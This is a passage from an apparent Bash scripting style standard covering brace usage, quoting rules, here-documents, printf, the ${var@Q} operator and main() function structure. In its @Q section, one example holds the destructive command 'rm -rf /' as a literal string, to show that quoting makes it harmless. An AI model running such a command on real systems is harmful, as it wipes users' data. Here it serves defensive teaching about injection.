   "${var##*/}"        # Pattern removal
   "${var:-default}"   # Default value
   "${var:0:5}"        # Substring
   "${var//old/new}"   # Substitution
   "${var,,}"          # Case conversion
   ```

2. **Variable concatenation (no separator):**
   ```bash
   "${var1}${var2}"    # Adjacent variables
   "${prefix}suffix"   # Variable + alphanumeric
   ```

3. **Array access:**
   ```bash
   "${array[index]}"   # Element access
   "${array[@]}"       # All elements
   "${#array[@]}"      # Array length
   ```

4. **Special parameter expansion:**
   ```bash
   "${@:2}"            # Positional from 2nd
   "${10}"             # Positional > 9
   "${!var}"           # Indirect expansion
   ```

---

#### When Braces Are NOT Required

**Standalone variables:**
```bash
# ✓ Correct
"$var"  "$HOME"  "$SCRIPT_DIR"

# ✗ Wrong - unnecessary braces
"${var}"  "${HOME}"  "${SCRIPT_DIR}"
```

**Path concatenation with separators:**
```bash
# ✓ Correct - separators delimit naturally
"$PREFIX"/bin
"$PREFIX/bin"
"$SCRIPT_DIR"/build/lib

# ✗ Wrong - unnecessary braces
"${PREFIX}"/bin
"${SCRIPT_DIR}"/build
```

**In strings with separators:**
```bash
# ✓ Correct
echo "Installing to $PREFIX/bin"
info "Found $count files"

# ✗ Wrong
echo "Installing to ${PREFIX}/bin"
info "Found ${count} files"
```

---

#### Edge Cases

**When next character is alphanumeric AND no separator:**
```bash
# Braces required
"${var}_suffix"      # Prevents $var_suffix
"${prefix}123"       # Prevents $prefix123

# No braces needed - separator present
"$var-suffix"        # Dash separates
"$var.suffix"        # Dot separates
"$var/path"          # Slash separates
```

---

#### Summary Table

| Situation | Form | Example |
|-----------|------|---------|
| Standalone variable | `"$var"` | `"$HOME"` |
| Path with separator | `"$var"/path` | `"$BIN_DIR"/file` |
| Parameter expansion | `"${var%pattern}"` | `"${path%/*}"` |
| Concatenation (no sep) | `"${var1}${var2}"` | `"${prefix}${suffix}"` |
| Array access | `"${array[i]}"` | `"${args[@]}"` |

**Key Principle:** Use `"$var"` by default. Only add braces when required for correct parsing.


---


**Rule: BCS0211**

## Boolean Flags Pattern

For boolean state tracking, use integer variables with `declare -i` or `local -i`:

```bash
# Boolean flags - declare as integers with explicit initialization
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0
declare -i NON_INTERACTIVE=0
declare -i UNINSTALL=0
declare -i DRY_RUN=0

# Test flags in conditionals using (())
((DRY_RUN)) && info 'Dry-run mode enabled'

if ((INSTALL_BUILTIN)); then
  install_loadable_builtins
fi

# Toggle flags
((VERBOSE)) && VERBOSE=0 || VERBOSE=1

# Set flags from command-line parsing
case $1 in
  --dry-run)    DRY_RUN=1 ;;
  --skip-build) SKIP_BUILD=1 ;;
esac
```

**Guidelines:**
- Use `declare -i` for integer-based boolean flags
- Name flags descriptively in ALL_CAPS (e.g., `DRY_RUN`, `INSTALL_BUILTIN`)
- Initialize explicitly to `0` (false) or `1` (true)
- Test with `((FLAG))` in conditionals (returns true for non-zero, false for zero)
- Avoid mixing boolean flags with integer counters - use separate variables


---


**Rule: BCS0300**

# Strings & Quoting

This section establishes critical quoting rules that prevent word-splitting errors and make code intent clear. The fundamental principle: **single quotes** for static strings, **double quotes** when variable expansion is needed.

**7 Rules:**

1. **Quoting Fundamentals** (BCS0301) - Core rules for static vs. dynamic strings
2. **Command Substitution** (BCS0302) - Quoting `$(...)` results
3. **Quoting in Conditionals** (BCS0303) - Variable quoting in `[[ ]]`
4. **Here Documents** (BCS0304) - Delimiter quoting for heredocs
5. **printf Patterns** (BCS0305) - Format string and argument quoting
6. **Parameter Quoting** (BCS0306) - Using `${param@Q}` for safe display
7. **Anti-Patterns** (BCS0307) - Common quoting mistakes to avoid

**Key principle:** Single quotes signal "literal text" while double quotes signal "variable expansion needed."


---


**Rule: BCS0301**

### Quoting Fundamentals

**Rule: BCS0301** (Merged from BCS0401 + BCS0402 + BCS0403 + BCS0404)

Core quoting rules for strings, variables, and literals.

---

#### The Fundamental Rule

**Single quotes** for static strings, **double quotes** when variable expansion needed.

```bash
# ✓ Correct - single quotes for static
info 'Checking prerequisites...'
error 'Failed to connect'
[[ "$status" == 'success' ]]

# ✓ Correct - double quotes for variables
info "Found $count files"
die 1 "File '$SCRIPT_DIR/testfile' not found"
echo "$SCRIPT_NAME $VERSION"
```

---

#### Why Single Quotes for Static Strings

1. **Performance**: Slightly faster (no variable/escape parsing)
2. **Clarity**: Signals "this is literal, no substitution"
3. **Safety**: Prevents accidental expansion
4. **No escaping**: `$`, `` ` ``, `\` are literal

```bash
# Single quotes preserve special characters
msg='The variable $PATH will not expand'
sql='SELECT * FROM users WHERE name = "John"'
regex='^\$[0-9]+\.[0-9]{2}$'
```

---

#### Mixed Quoting Pattern

Nest single quotes inside double quotes for literal display:

```bash
# Variable with visible quotes around value
die 1 "Unknown option '$1'"
warn "Cannot access '$file_path'"
error "Permission denied for '$dir'"
```

---

#### One-Word Literal Exception

Simple alphanumeric values (containing only `a-zA-Z0-9_-./`) may be unquoted:

```bash
# ✓ Acceptable and Standard
STATUS=success
VERSION=1.0.0
[[ "$level" == INFO ]]

# ✓ Acceptable
STATUS='success'
VERSION='1.0.0'
[[ "$level" == 'INFO' ]]
```

**Mandatory quoting required for:**
- Spaces: `'File not found'`
- Special characters: `'user@domain.com'`, `'*.txt'`
- Empty strings: `''`
- Values with `$`, quotes, backslashes

---

#### Anti-Patterns

```bash
# ✗ Wrong - double quotes for static strings
info "Checking prerequisites..."
[[ "$status" == "active" ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == 'active' ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == active ]]
```

```bash
# ✗ Wrong - special characters unquoted
EMAIL=user@domain.com
PATTERN=*.log

# ✓ Correct
EMAIL='user@domain.com'
PATTERN='*.log'
```

---

#### Path Concatenation Quoting

When concatenating variables with literal paths, quote the variable portion separately from the literal:

```bash
# ✓ RECOMMENDED - separate quoting for clarity
"$PREFIX"/bin
"$SCRIPT_DIR"/data/"$filename"
cat "$dir"/"$file"
[[ -f "$CONFIG_DIR"/hosts.conf ]]
install -m 755 "$TEMP_DIR"/"$file" "$INSTALL_DIR"/"$file"

# ACCEPTABLE - variable and literal combined
"$PREFIX/bin"
"$SCRIPT_DIR/data/$filename"
cat "$dir/$file"
```

**Rationale:**
- Makes variable boundaries visually explicit
- Improves readability when paths have multiple variables
- Consistent with how shell parses (variable ends at unquoted character)

**Note:** Both forms work correctly. The separate quoting is a style preference that improves clarity, especially in complex paths.

---

#### Quick Reference

| Content | Quote Type | Example |
|---------|------------|---------|
| Static text | Single | `'Processing...'` |
| With variable | Double | `"Found $count files"` |
| Variable in quotes | Mixed | `"Option '$1' invalid"` |
| One-word literal | Optional | `STATUS=success` or `STATUS='success'` |
| Special chars | Single | `'user@example.com'` |
| Empty string | Single | `VAR=''` |
| Path with separator | Separate | `"$var"/path` |

**Key principle:** Use single quotes as the default. Switch to double quotes only when expansion is needed.


---


**Rule: BCS0302**

### Command Substitution

**Rule: BCS0302** (From BCS0405)

Quoting rules for command substitution.

---

#### Rule

Use double quotes when strings include command substitution:

```bash
# ✓ Correct - double quotes for command substitution
echo "Current time: $(date +%T)"
info "Found $(wc -l < "$file") lines"
```

When assigning variables, double quotes around the value are only required if there is concatenation of values in the string:

```
# ✓ Correct - double quotes for command substitution
VERSION=$(git describe --tags 2>/dev/null || echo 'unknown')
TIMESTAMP=$(date -Ins)
BASEDIR=$PREFIX

# ✗ Wrong - unnecessary double quotes
VERSION="$(git describe --tags 2>/dev/null || echo 'unknown')"
TIMESTAMP="$(date -Ins)"
BASEDIR="$PREFIX"

# ✓ Correct - double quotes for command substitution
VERSION="$(git describe --tags 2>/dev/null || echo 'unknown')".beta
TIMESTAMP="$(date -Ins)"-Jakarta
BASEDIR="$PREFIX"/config
```

---

#### Always Quote the Result

```bash
# ✓ Correct - quoted result
result=$(command)
echo "$result"

# ✗ Wrong - unquoted result
echo $result    # Word splitting occurs!
```

---

**Key principle:** Command substitution results should always be quoted to preserve whitespace and prevent word splitting.


---


**Rule: BCS0303**

### Quoting in Conditionals

**Rule: BCS0303**

Variable quoting in test expressions.

---

#### The Rule

**Always quote variables** in conditionals. Static comparison values follow normal rules (single quotes for literals with breaking chars).

```bash
# ✓ Correct - variable quoted
[[ -f "$file" ]]
[[ "$name" == value ]]

# ✗ Wrong - unquoted variable
[[ -f $file ]]
[[ $name == value ]]
```

---

#### Why Quote Variables

1. **Word splitting**: `$file` with spaces becomes multiple arguments
2. **Glob expansion**: `$file` with `*` expands to matching files
3. **Empty values**: Unquoted empty variables cause syntax errors
4. **Security**: Prevents injection attacks

---

#### Common Patterns

```bash
# File tests
[[ -f "$file" ]]
[[ -d "$directory" && -r "$directory" ]]

# String comparisons (variable quoted, literal single-quoted)
[[ "$action" == 'start' ]]
[[ -z "$value" ]]
[[ -n "$result" ]]

# Numeric comparisons
declare -i count=0
((count > 10))

# Pattern matching (pattern unquoted for globbing)
[[ "$filename" == *.txt ]]        # Glob match
[[ "$filename" == '*.txt' ]]      # Literal match

# Regex (pattern variable unquoted)
pattern='^[0-9]+$'
[[ "$input" =~ $pattern ]]        # ✓ Pattern unquoted
[[ "$input" =~ "$pattern" ]]      # ✗ Becomes literal
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted variable
[[ -f $file ]] # Breaks with spaces
[[ $name == value with breaking chars ]] # Breaks with spaces

# ✗ Wrong - double quotes for static literal
[[ "$mode" == "production" ]]

# ✓ Correct
[[ "$mode" == 'production' ]]
[[ "$mode" == production ]]  # One-word literal OK
```

---

**Key principle:** Variable quoting in conditionals is mandatory. Quote all variables: `[[ -f "$file" ]]`.


---


**Rule: BCS0304**

### Here Documents

**Rule: BCS0304** (Merged from BCS0408 + BCS1104)

Quoting rules for here documents.

---

#### Delimiter Quoting

| Delimiter | Variable Expansion | Use Case |
|-----------|-------------------|----------|
| `<<EOF` | Yes | Dynamic content with variables |
| `<<'EOF'` | No | Literal content (JSON, SQL) |
| `<<"EOF"` | No | Same as single quotes |

---

#### With Variable Expansion

```bash
# Unquoted delimiter - variables expand
cat <<EOF
User: $USER
Home: $HOME
Time: $(date)
EOF
```

---

#### Literal Content (No Expansion)

```bash
# Single-quoted delimiter - no expansion
cat <<'EOF'
{
  "name": "$APP_NAME",
  "version": "$VERSION"
}
EOF
```

---

#### Indented Content

```bash
# <<- removes leading tabs (not spaces)
if condition; then
	cat <<-EOF
	Indented content
	Aligned with code
	EOF
fi
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted when literal needed
cat <<EOF
SELECT * FROM users WHERE name = "$name"
EOF
# SQL injection risk if $name is attacker-controlled!

# ✓ Correct - quoted for literal SQL
cat <<'EOF'
SELECT * FROM users WHERE name = ?
EOF
```

---

**Key principle:** Quote the delimiter (`<<'EOF'`) to prevent expansion; leave unquoted for variable substitution.


---


**Rule: BCS0305**

### printf Patterns

**Rule: BCS0305**

Quoting rules for printf and echo.

---

#### Basic Pattern

```bash
# Format string: single quotes (static)
# Variables: double-quoted as arguments
printf '%s: %d files found\n' "$name" "$count"

# Static strings - single quotes
echo 'Installation complete'
printf '%s\n' 'Processing files'

# With variables - double quotes
echo "$SCRIPT_NAME $VERSION"
printf 'Found %d files in %s\n' "$count" "$dir"
```

---

#### Format String Escapes

```bash
# Common format specifiers
printf '%s\n'   "$string"       # String
printf '%d\n'   "$integer"      # Decimal
printf '%f\n'   "$float"        # Float
printf '%x\n'   "$hex"          # Hexadecimal
printf '%%\n'                   # Literal %
```

---

#### Prefer printf Over echo -e

```bash
# ✗ Avoid - echo -e behavior varies
echo -e "Line1\nLine2"

# ✓ Prefer - printf is consistent
printf 'Line1\nLine2\n'

# Or use $'...' for escape sequences
echo $'Line1\nLine2'
```

---

**Key principle:** Single quotes for format strings, double quotes for variable arguments.


---


**Rule: BCS0306**

### Parameter Quoting with @Q

**Rule: BCS0306**

Using `${parameter@Q}` for safe display of user input.

---

#### The @Q Operator

`${parameter@Q}` expands to a shell-quoted value that can be safely displayed and re-used.

```bash
name='hello world'
echo "${name@Q}"      # Output: 'hello world'

name='$(rm -rf /)'
echo "${name@Q}"      # Output: '$(rm -rf /)' (safe, literal)
```

---

#### Primary Use: Error Messages

```bash
# ✗ Wrong - injection risk
die 2 "Unknown option $1"
die 2 "Unknown option '$1'"

# ✓ Correct - safe display
die 2 "Unknown option ${1@Q}"

# Validation function
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}
```

---

#### Dry-Run Display

```bash
run_command() {
  local -a cmd=("$@")
  if ((DRY_RUN)); then
    local -- quoted_cmd
    printf -v quoted_cmd '%s ' "${cmd[@]@Q}"
    info "[DRY-RUN] Would execute: $quoted_cmd"
    return 0
  fi
  "${cmd[@]}"
}
```

---

#### Comparison

| Input | `$var` | `"$var"` | `${var@Q}` |
|-------|--------|----------|------------|
| `hello world` | splits | `hello world` | `'hello world'` |
| `$(date)` | executes | executes | `'$(date)'` |
| `*.txt` | globs | `*.txt` | `'*.txt'` |

---

#### When to Use

**Use @Q for:**
- Error messages: `die 2 "Invalid ${opt@Q}"`
- Logging user input: `info "Processing ${file@Q}"`
- Dry-run output: `info "[DRY-RUN] ${cmd@Q}"`

**Don't use @Q for:**
- Normal variable expansion: `process "$file"`
- Comparisons: `[[ "$var" == "$value" ]]`

---

**Key principle:** Use `${parameter@Q}` when displaying user input in error messages to prevent injection.


---


**Rule: BCS0307**

### Quoting Anti-Patterns

**Rule: BCS0307**

Common quoting mistakes to avoid.

---

#### Category 1: Double Quotes for Static Strings

```bash
# ✗ Wrong
info "Checking prerequisites..."
[[ "$status" == "active" ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == 'active' ]]

# ✓ Acceptable
info 'Checking prerequisites...'
[[ "$status" == active ]]
```

---

#### Category 2: Unquoted Variables

```bash
# ✗ Wrong - word splitting/glob expansion
[[ -f $file ]]
echo $result
rm $temp_file

# ✓ Correct
[[ -f "$file" ]]
echo "$result"
rm "$temp_file"
```

---

#### Category 3: Unnecessary Braces

```bash
# ✗ Wrong - braces not needed
echo "${HOME}/bin"
path="${CONFIG_DIR}/app.conf"

# ✓ Correct
echo "$HOME"/bin
path="$CONFIG_DIR"/app.conf

# ✓ Acceptable
echo "$HOME/bin"
path="$CONFIG_DIR/app.conf"

# Braces ARE needed for:
"${var:-default}"     # Default value
"${file##*/}"         # Parameter expansion
"${array[@]}"         # Array expansion
"${var1}${var2}"      # Adjacent variables
```

---

#### Category 4: Unquoted Arrays

```bash
# ✗ Wrong
for item in ${items[@]}; do

# ✓ Correct
for item in "${items[@]}"; do
```

---

#### Category 5: Glob Expansion Danger

```bash
pattern='*.txt'

# ✗ Wrong
echo $pattern       # Expands to all .txt files!

# ✓ Correct
echo "$pattern"     # Outputs literal: *.txt
```

---

#### Category 6: Here-doc Delimiter

```bash
# ✗ Wrong - variables expand unexpectedly
cat <<EOF
SELECT * FROM users WHERE name = "$name"
EOF

# ✓ Correct - quoted for literal content
cat <<'EOF'
SELECT * FROM users WHERE name = ?
EOF
```

---

#### Quick Reference

| Context | Correct | Wrong |
|---------|---------|-------|
| Static string | `'literal'` | `"literal"` |
| Variable | `"$var"` | `$var` |
| Path with var | `"$HOME"/bin` | `"${HOME}/bin"` |
| Conditional | `[[ -f "$file" ]]` | `[[ -f $file ]]` |
| Array | `"${arr[@]}"` | `${arr[@]}` |
| Static literal | `== 'value'` | `== "value"` |

---

**Key principle:** Single quotes for static text, double quotes for variables, avoid unnecessary braces, always quote variables.


---


**Rule: BCS0400**

# Functions

This section defines function definition patterns, naming conventions (lowercase_with_underscores), and organization principles. It mandates the `main()` function for scripts exceeding 200 lines to improve structure and testability, explains function export for sourceable libraries (`declare -fx`), and details production optimization practices where unused utility functions should be removed once scripts mature. Functions should be organized bottom-up: messaging functions first, then helpers, then business logic, with `main()` last—this ensures each function can safely call previously defined functions and readers understand primitives before composition.


---


**Rule: BCS0401**

## Function Definition Pattern

```bash
# Single-line functions for simple operations
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }

# Multi-line functions with local variables
main() {
  local -i exitcode=0
  local -- variable
  # Function body
  return "$exitcode"
}
```


---


**Rule: BCS0402**

## Function Names
Use lowercase with underscores to match shell conventions and avoid conflicts with built-in commands.

```bash
# ✓ Good - lowercase with underscores
my_function() {
  …
}

process_log_file() {
  …
}

# ✓ Private functions use leading underscore
_my_private_function() {
  …
}

_validate_input() {
  …
}

# ✗ Avoid - CamelCase or UPPER_CASE
MyFunction() {      # Don't do this
  …
}

PROCESS_FILE() {    # Don't do this
  …
}
```

**Rationale:**
- **Lowercase with underscores**: Matches standard Unix/Linux utility naming (e.g., `grep`, `sed`, `file_name`)
- **Avoid CamelCase**: Can be confused with variables or commands
- **Underscore prefix for private**: Clear signal that function is for internal use only
- **Consistency**: All built-in bash commands are lowercase

**Anti-patterns to avoid:**
```bash
# ✗ Don't override built-in commands without good reason
cd() {           # Dangerous - overrides built-in cd
  builtin cd "$@" && ls
}

# ✓ If you must wrap built-ins, use a different name
change_dir() {
  builtin cd "$@" && ls
}

# ✗ Don't use special characters
my-function() {  # Dash creates issues in some contexts
  …
}
```


---


**Rule: BCS0403**

## Main Function

**Always include a `main()` function for scripts longer than approximately 200 lines. The main function serves as the single entry point, orchestrating the script's logic and making the code more organized, testable, and maintainable. Place `main "$@"` at the bottom of the script, just before the `#fin` marker.**

**Rationale:**

- **Single Entry Point**: Provides clear script execution flow starting from one well-defined function
- **Testability**: Scripts can be sourced for testing without executing; functions can be tested individually
- **Organization**: Separates initialization, argument parsing, and main logic into clear sections
- **Debugging**: Easy to add debugging output or dry-run logic in one central location
- **Scope Control**: All script execution variables can be local to main, preventing global namespace pollution
- **Exit Code Management**: Centralized return/exit code handling for consistent error reporting

**When to use main():**

```bash
# Use main() when:
# - Script is longer than ~200 lines
# - Script has multiple functions
# - Script requires argument parsing
# - Script needs to be testable
# - Script has complex logic flow

# Can skip main() when:
# - Script is trivial (< 200 lines)
# - Script is a simple wrapper
# - Script has no functions
# - Script is linear (no branching)
```

**Basic main() structure:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Functions
# ============================================================================

# ... helper functions ...

# ============================================================================
# Main
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -h|--help) show_help; return 0 ;;
    # short options...
    *) die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done
  # Argument validation
  : ...

  # Main logic
  info 'Starting processing...'
  : ...

  # ... business logic ...
  : ...

  # Return success
  return 0
}

# Script invocation
main "$@"
#fin
```

**Main function with argument parsing:**

```bash
main() {
  # Local variables for parsed options
  local -i verbose=0
  local -i dry_run=0
  local -- output_file=''
  local -a input_files=()

  # Parse arguments
  while (($#)); do case $1 in
    -n|--dry-run) dry_run=1 ;;
    -o|--output)
      noarg "$@"
      shift
      output_file=$1
      ;;
    -v|--verbose) verbose=1 ;;
    -q|--quiet)   verbose=0 ;;
    -h|--help)
      usage
      return 0
      ;;
    --)
      shift
      break
      ;;
    -*)
      die 22 "Invalid option ${1@Q}"
      ;;
    *)
      input_files+=("$1")
      ;;
  esac; shift; done

  # Remaining arguments after --
  input_files+=("$@")

  # Make parsed values readonly
  readonly -- verbose dry_run output_file
  readonly -a input_files

  # Validate arguments
  if ((${#input_files[@]} == 0)); then
    error 'No input files specified'
    usage
    return 22
  fi

  # Main logic
  if ((verbose)); then
    info "Processing ${#input_files[@]} files"
    ((dry_run)) && info '[DRY-RUN] Mode enabled' ||:
  fi

  # Process files
  local -- file
  for file in "${input_files[@]}"; do
    process_file "$file"
  done

  return 0
}
```

**Main function with setup/cleanup:**

```bash
# Cleanup function
cleanup() {
  local -i exit_code=${1:-$?}

  # Cleanup operations
  if [[ -n "${TEMP_DIR:-}" && -d "$TEMP_DIR" ]]; then
    rm -rf "$TEMP_DIR"
  fi

  return "$exit_code"
}

main() {
  # Setup trap for cleanup
  trap cleanup EXIT

  # Create temp directory
  TEMP_DIR=$(mktemp -d)
  readonly -- TEMP_DIR

  # Main logic
  info "Using temp directory ${TEMP_DIR@Q}"

  # ... processing ...

  # Cleanup happens automatically via trap
  return 0
}

main "$@"
#fin
```

**Main function with error handling:**

```bash
main() {
  local -i errors=0

  # Parse arguments
  # ...

  # Process items with error tracking
  local -- item
  for item in "${items[@]}"; do
    if ! process_item "$item"; then
      error "Failed to process: $item"
      errors+=1
    fi
  done

  # Report results
  if ((errors)); then
    error "Completed with $errors errors"
    return 1
  else
    success 'All items processed successfully'
    return 0
  fi
}
```

**Main function enabling sourcing for tests:**

```bash
# ...
# ...
# Script can be sourced for testing
# Only execute main if script is run directly (not sourced)
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Do set here
set -euo pipefail

main() {
  # ... script logic ...
  return 0
}

main "$@"
#fin
```

**Complete example with main():**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Color Definitions
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  case ${FUNCNAME[1]} in
    info) prefix+=" ${CYAN}◉${NC}" ;;
    error) prefix+=" ${RED}✗${NC}" ;;
    *) ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Documentation Functions
# ============================================================================

show_help() {
  cat <<EOF
$SCRIPT_NAME $VERSION - Process files

Process files with various options.

Usage: $SCRIPT_NAME [OPTIONS] FILE...

Options:
  -v, --verbose     Enable verbose output
  -q, --quiet       Disable verbose output
  -n, --dry-run     Show what would be done
  -o, --output DIR  Output directory
  -h, --help        Show this help

Examples:
  $SCRIPT_NAME file.txt
  $SCRIPT_NAME -v -o /tmp file1.txt file2.txt
  $SCRIPT_NAME -n --output /backup *.txt
EOF
}

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# ============================================================================
# Business Logic Functions
# ============================================================================

process_file() {
  local -- file=$1

  # Validate file
  if [[ ! -f "$file" ]]; then
    error "File not found ${file@Q}"
    return 2
  fi

  info "Processing ${file@Q}"

  # Process file logic
  # ...

  return 0
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Declare option variables
  local -i verbose=0
  local -i dry_run=0
  local -- output_dir=''
  local -a input_files=()

  # Parse command-line arguments
  while (($#)); do case $1 in
    -v|--verbose) verbose=1 ;;
    -n|--dry-run) dry_run=1 ;;
    -o|--output)
      noarg "$@"
      shift
      output_dir=$1
      ;;
    -h|--help)
      show_help
      return 0
      ;;
    --)
      shift
      break
      ;;
    -*)
      die 22 "Invalid option ${1@Q}"
      ;;
    *)
      input_files+=("$1")
      ;;
  esac; shift; done

  # Collect remaining arguments
  input_files+=("$@")

  # Make options readonly
  readonly -- verbose dry_run output_dir
  readonly -a input_files

  # Validate arguments
  if [[ ${#input_files[@]} -eq 0 ]]; then
    error 'No input files specified'
    usage
    return 22
  fi

  if [[ -n "$output_dir" && ! -d "$output_dir" ]]; then
    error "Output directory not found ${output_dir@Q}"
    return 2
  fi

  # Display configuration
  if ((verbose)); then
    info "$SCRIPT_NAME $VERSION"
    info "Input files: ${#input_files[@]}"
    [[ -n "$output_dir" ]] && info "Output: $output_dir"
    ((dry_run)) && info '[DRY-RUN] Mode enabled' ||:
  fi

  # Process each file
  local -- file
  local -i success_count=0
  local -i error_count=0

  for file in "${input_files[@]}"; do
    if ((dry_run)); then
      info "[DRY-RUN] Would process ${file@Q}"
      success_count+=1
    elif process_file "$file"; then
      success_count+=1
    else
      error_count+=1
    fi
  done

  # Report results
  if ((verbose)); then
    info "Processed: $success_count files"
    ((error_count)) && info "Errors: $error_count" ||:
  fi

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Script Invocation
# ============================================================================

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - no main function in complex script
#!/bin/bash
set -euo pipefail

# ... 200 lines of code directly in script ...
# Hard to test, hard to organize

# ✓ Correct - main function
#!/bin/bash
set -euo pipefail

# ... helper functions ...

main() {
  # Script logic
}

main "$@"
#fin

# ✗ Wrong - main() not at end
main() {
  # ...
}

main "$@"  # Called here

# More functions defined after main is called
helper_function() {
  # ...
}
# This function is defined after main executes!

# ✓ Correct - main() at end, called last
helper_function() {
  # ...
}

main() {
  # Can call helper_function
}

main "$@"
#fin

# ✗ Wrong - parsing arguments outside main
verbose=0
dry_run=0

while (($#)); do
  # ... parse args ...
done

main() {
  # Uses global variables
}

main "$@"  # Arguments already consumed!

# ✓ Correct - parsing in main
main() {
  local -i verbose=0
  local -i dry_run=0

  while (($#)); do
    # ... parse args ...
  done

  readonly -- verbose dry_run
  # ... use variables ...
}

main "$@"

# ✗ Wrong - not passing arguments
main() {
  # Expects arguments but they're not passed
}

main  # Missing "$@"!

# ✓ Correct - pass all arguments
main "$@"

# ✗ Wrong - mixing global and local logic
total=0  # Global

main() {
  local -i count=0
  # Mixes global and local state
  ((total+=count)) # note: total not defined as int, thus (()) required
}

# ✓ Correct - all logic in main
main() {
  local -i total=0
  local -i count=0
  # All local, clean scope
  total+=count
}
```

**Edge cases:**

**1. Script needs global configuration:**

```bash
# Global configuration (before functions)
declare -i VERBOSE=0
declare -i DRY_RUN=0

main() {
  # Parse arguments and modify globals
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE+=1 ;;
    -q|--quiet)   VERBOSE=0 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    *) die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done

  # Make globals readonly
  readonly -- VERBOSE DRY_RUN

  # ... rest of logic ...
}

main "$@"
```

**2. Script has initialization code:**

```bash
# Initialization before main
declare -A CONFIG=()

load_config() {
  # Load configuration into global array
  # ...
}

# Load before main
load_config

main() {
  # Use CONFIG array
  echo "App: ${CONFIG[app_name]}"
}

main "$@"
```

**3. Script is library and executable:**

```bash
# Library functions
utility_function() {
  # ...
}

# Main function for when executed
main() {
  # ...
}

# Only run main if executed (not sourced)
[[ "${BASH_SOURCE[0]}" == "${0}" ]] || return

main "$@"
#fin
```

**4. Multiple main scenarios:**

```bash
# Different modes
main_install() {
  # Installation logic
}

main_uninstall() {
  # Uninstallation logic
}

main() {
  local -- mode=${1:-}

  case "$mode" in
    install) shift; main_install "$@" ;;
    uninstall) shift; main_uninstall "$@" ;;
    *) die 22 "Invalid mode ${mode@Q}" ;;
  esac
}

main "$@"
```

**Testing with main():**

```bash
# Script: myapp.sh
main() {
  local -i value=$1
  ((value * 2))
  echo "$value"
}

# Only execute if run directly
[[ "${BASH_SOURCE[0]}" == "${0}" ]] || return
main "$@"

# Test file: test_myapp.sh
#!/bin/bash
source ./myapp.sh  # Source without executing

# Test main function
declare -i result
result=$(main 5)

if ((result == 10)); then
  echo "PASS"
else
  echo "FAIL: Expected 10, got ${result@Q}"
fi
```

**Summary:**

- **Use main() for scripts >200 lines** - provides organization and testability
- **Single entry point** - all execution flows through main()
- **Place main() at end** - define helpers first, main last
- **Always call with "$@"** - `main "$@"` to pass all arguments
- **Parse arguments in main** - keep argument handling in one place
- **Make locals readonly** - after parsing, make option variables readonly
- **Return appropriate code** - 0 for success, non-zero for errors
- **Consider sourcing** - use `[[ "${BASH_SOURCE[0]}" == "${0}" ]]` for testability
- **Organize sections** - messaging, documentation, helpers, business logic, main

**Key principle:** The main() function is the orchestrator - it doesn't do the work, it coordinates it. All heavy lifting should be in helper functions. Main's job is to parse arguments, validate input, call the right functions in the right order, and return an appropriate exit code. This separation makes scripts testable, debuggable, and maintainable.


---


**Rule: BCS0404**

## Function Export
```bash
# Export functions when needed by subshells
grep() { /usr/bin/grep "$@"; }
find() { /usr/bin/find "$@"; }
declare -fx grep find
```


---


**Rule: BCS0405**

## Production Script Optimization
Once a script is mature and ready for production:
- Remove unused utility functions (e.g., if `yn()`, `decp()`, `trim()`, `s()` are not used)
- Remove unused global variables (e.g., `SCRIPT_DIR`, `PROMPT`, `DEBUG` if not referenced)
- Remove unused messaging functions that your script doesn't call
- Keep only the functions and variables your script actually needs
- This reduces script size, improves clarity, and eliminates maintenance burden

Example: A simple script may only need `error()` and `die()`, not the full messaging suite.


---


**Rule: BCS0406**

### Dual-Purpose Scripts

**Rule: BCS0606** (Elevated from BCS010201)

Scripts that can be both executed directly and sourced as libraries.

---

#### Rationale

Dual-purpose scripts provide:
- Reusable functions without code duplication
- Direct execution for standalone use
- Library sourcing for integration
- Testing flexibility (source functions, run tests)

---

#### Basic Pattern

```bash
#!/usr/bin/env bash
# my-lib.sh - Dual-purpose library/script

# Define functions first (before any set -e)
my_function() {
  local -- arg=$1
